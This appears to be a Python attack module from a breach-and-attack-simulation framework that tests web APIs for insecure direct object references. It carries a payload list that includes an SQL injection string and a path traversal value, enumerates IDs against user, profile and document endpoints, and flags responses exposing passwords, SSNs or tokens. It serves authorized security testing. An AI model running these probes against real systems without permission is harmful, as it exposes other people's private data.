"""IDOR (Insecure Direct Object Reference) testing. MITRE ATT&CK: T1078"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

IDOR_PAYLOADS = ["1", "2", "0", "-1", "999999", "admin", "100", "1000",
    "../1", "00000001", "1' OR '1'='1", "null", "undefined"]

class IDORModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="idor", description="Insecure Direct Object Reference testing", category="idor",
            mitre_technique_ids=["T1078"], mitre_technique_names=["Valid Accounts"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, owasp_category="A01:2021 - Broken Access Control",
            cwe_ids=["CWE-639"], tags=["idor", "access_control", "bola"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        return IDOR_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        params = options.get("params", ["id", "user_id", "account", "uid", "profile"])
        paths = options.get("idor_paths", ["/api/users/{id}", "/api/profile/{id}", "/api/documents/{id}"])
        requests = []
        for p in payloads:
            for param in params[:3]:
                requests.append(AttackRequest(request_id=f"idor-{uuid.uuid4().hex[:8]}", target=target,
                    method="GET", path=options.get("path", "/"), params={param: p}))
            for path_tmpl in paths:
                requests.append(AttackRequest(request_id=f"idor-{uuid.uuid4().hex[:8]}", target=target,
                    method="GET", path=path_tmpl.replace("{id}", p)))
        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        if response.status_code == 200 and len(response.body) > 50:
            body = response.body_text.lower()
            sensitive = ["email", "password", "ssn", "credit", "phone", "address", "token", "secret", "private"]
            found = [s for s in sensitive if s in body]
            if found:
                return ModuleResult(module_name="idor", target=request.target, status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload, response_code=response.status_code, response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms, evidence=f"IDOR: Accessible with id={payload}, sensitive fields: {found}",
                    severity="high", mitre_technique_id="T1078")
        return ModuleResult(module_name="idor", target=request.target, status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
